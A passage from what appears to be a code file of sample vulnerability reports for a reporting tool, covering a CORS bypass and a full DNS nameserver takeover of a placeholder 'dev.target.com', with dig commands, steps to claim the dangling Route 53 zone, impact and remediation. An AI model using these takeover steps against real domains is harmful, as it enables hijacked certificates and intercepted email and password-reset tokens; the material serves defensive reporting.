- **CORS Bypass:** Allowed origin rules trusting \`*.target.com\` can be bypassed to exfiltrate private user records.

---

## Remediation:
1. **Immediate:** Delete the DNS CNAME record for \`assets.target.com\` from your authoritative DNS provider (Route 53 / Cloudflare).
2. **Best Practice:** When mapping AWS services, use Route 53 Alias records instead of standard CNAMEs. Alias records automatically terminate when the underlying resource is deleted.`,
  },
  {
    id: "rep-dangling-ns-takeover",
    title: {
      en: "Critical Full DNS & Domain Takeover via Dangling Route 53 / DigitalOcean Name Server Delegation",
      simple: "Complete Domain Takeover via Abandoned Cloud Nameservers",
      hi: "लावारिस क्लाउड नेम-सर्वर्स के कारण पूरे डोमेन और ईमेल्स का क्रिटिकल टेकओवर",
    },
    vulnType: "CWE-284: Improper Access Control (DNS Delegation Takeover)",
    cvss: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (9.8 - Critical)",
    severity: "critical",
    reportMarkdown: `## Summary:
The subdomain \`dev.target.com\` is vulnerable to a complete Name Server (NS) Takeover. The parent domain's DNS configuration delegates authority for \`dev.target.com\` to four AWS Route 53 / DigitalOcean nameservers. However, the corresponding hosted zone was deleted from the organization's cloud account.

Because the delegation remains active, an attacker can claim the zone in their own cloud account. Once claimed, the attacker gains 100% control over the entire DNS tree for \`dev.target.com\`, allowing them to create arbitrary A, CNAME, and MX records, issue valid SSL certificates via Let's Encrypt DNS-01 challenges, and intercept all email communications sent to \`@dev.target.com\`.

---

## Step-by-Step Reproduction:
1. Inspect the NS records for the subdomain:
   \`\`\`bash
   $ dig dev.target.com NS +short
   ns-182.awsdns-22.com.
   ns-741.awsdns-28.net.
   \`\`\`

2. Query the authoritative nameserver directly:
   \`\`\`bash
   $ dig @ns-182.awsdns-22.com dev.target.com A
   ;; ->>HEADER<<- opcode: QUERY, status: REFUSED
   \`\`\`
   The \`REFUSED\` status confirms that no hosted zone currently exists on this nameserver for \`dev.target.com\`.

3. In AWS Route 53, create hosted zones for \`dev.target.com\` until the assigned nameservers match the delegated set.
4. Add an A record pointing to a verification server.
5. Querying \`dev.target.com\` now resolves directly to the attacker's server with complete authoritative status.

---

## Impact:
- **Severity:** Critical (9.8)
- 100% authoritative DNS control over \`dev.target.com\`.
- Ability to generate legitimate publicly-trusted TLS/SSL certificates.
- Ability to intercept sensitive emails and password reset tokens sent to addresses at \`dev.target.com\`.

---

## Remediation:
- Remove the delegated NS records for \`dev.target.com\` from the apex \`target.com\` DNS zone immediately.`,
  },
];
